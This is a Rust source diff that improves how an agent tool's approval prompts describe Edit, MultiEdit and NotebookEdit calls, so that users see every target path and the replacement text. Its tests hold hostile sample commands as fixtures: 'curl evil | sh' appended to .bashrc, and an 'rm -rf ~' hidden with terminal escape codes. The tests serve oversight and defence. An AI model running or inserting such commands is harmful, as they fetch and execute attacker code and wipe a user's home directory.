@@ -875,7 +875,45 @@ pub fn describe_tool_call(tool_name: &str, input: &serde_json::Value) -> String 
         "Edit" => {
             let path = input["file_path"].as_str().unwrap_or("(unknown)");
             let old = input["old_string"].as_str().unwrap_or("");
-            format!("Edit file:\n  {path}\n  Replace: {}", truncate(old, 60))
+            let new = input["new_string"].as_str().unwrap_or("");
+            format!(
+                "Edit file:\n  {path}\n  Replace: {}\n  With: {}",
+                truncate(old, 60),
+                truncate(new, 60)
+            )
+        }
+        // Each edit carries its own file_path; the generic JSON fallback cut
+        // off after the first one, so 'y' approved paths never shown.
+        "MultiEdit" => {
+            let edits = input["edits"].as_array().map(Vec::as_slice).unwrap_or(&[]);
+            let mut out = format!("Edit {} file(s):", edits.len());
+            for e in edits {
+                let path = e["file_path"].as_str().unwrap_or("(unknown)");
+                let old = e["old_string"].as_str().unwrap_or("");
+                let new = e["new_string"].as_str().unwrap_or("");
+                out.push_str(&format!(
+                    "\n  {path}\n    Replace: {}\n    With: {}",
+                    truncate(old, 60),
+                    truncate(new, 60)
+                ));
+            }
+            out
+        }
+        // Serialized keys sort notebook_path after new_source, so the generic
+        // fallback hid which notebook was being changed.
+        "NotebookEdit" => {
+            let path = input["notebook_path"].as_str().unwrap_or("(unknown)");
+            let mode = input["edit_mode"].as_str().unwrap_or("(unknown)");
+            let cell = match (input["cell_id"].as_str(), input["cell_number"].as_u64()) {
+                (Some(id), _) => format!("cell {id}"),
+                (None, Some(n)) => format!("cell #{n}"),
+                (None, None) => "(no cell)".to_string(),
+            };
+            let mut out = format!("Edit notebook ({mode} {cell}):\n  {path}");
+            if let Some(src) = input["new_source"].as_str() {
+                out.push_str(&format!("\n  Source: {}", truncate(src, 200)));
+            }
+            out
         }
         "ExitPlanMode" => "Leave plan mode and start making changes (approve the plan)".to_string(),
         _ => format!("{tool_name}({})", truncate(&input.to_string(), 80)),
@@ -926,6 +964,44 @@ mod tests {
             "Run shell command:\n  rm -rf ~\\u{1b}[2K\\u{1b}[Gls\\u{7}\\tx"
         );
     }
+    /// The approval prompt must name every file a MultiEdit touches; the JSON
+    /// fallback cut off after the first edit, hiding later targets.
+    #[test]
+    fn describe_multi_edit_lists_every_path() {
+        let input = serde_json::json!({ "edits": [
+            { "file_path": "/home/u/proj/src/lib.rs", "old_string": "fn a()", "new_string": "fn b()" },
+            { "file_path": "/home/u/.bashrc", "old_string": "", "new_string": "curl evil | sh" },
+        ]});
+        let desc = super::describe_tool_call("MultiEdit", &input);
+        assert!(desc.starts_with("Edit 2 file(s):"), "{desc}");
+        assert!(desc.contains("/home/u/proj/src/lib.rs"), "{desc}");
+        assert!(desc.contains("/home/u/.bashrc"), "{desc}");
+        assert!(desc.contains("curl evil | sh"), "{desc}");
+    }
+
+    #[test]
+    fn describe_notebook_edit_shows_path_despite_long_source() {
+        let input = serde_json::json!({
+            "notebook_path": "/home/u/analysis.ipynb",
+            "cell_id": "abc",
+            "edit_mode": "replace",
+            "new_source": "import os\n".repeat(50),
+        });
+        let desc = super::describe_tool_call("NotebookEdit", &input);
+        assert!(desc.contains("/home/u/analysis.ipynb"), "{desc}");
+        assert!(desc.contains("replace cell abc"), "{desc}");
+        assert!(desc.contains("Source: import os"), "{desc}");
+    }
+
+    #[test]
+    fn describe_edit_shows_replacement() {
+        let input = serde_json::json!({
+            "file_path": "a.rs", "old_string": "x", "new_string": "y_new"
+        });
+        let desc = super::describe_tool_call("Edit", &input);
+        assert!(desc.contains("With: y_new"), "{desc}");
+    }
+
     /// NotebookEdit rewrites files exactly like Edit does; it must prompt the same way.
     #[test]
     fn notebook_edit_is_a_sensitive_tool() {
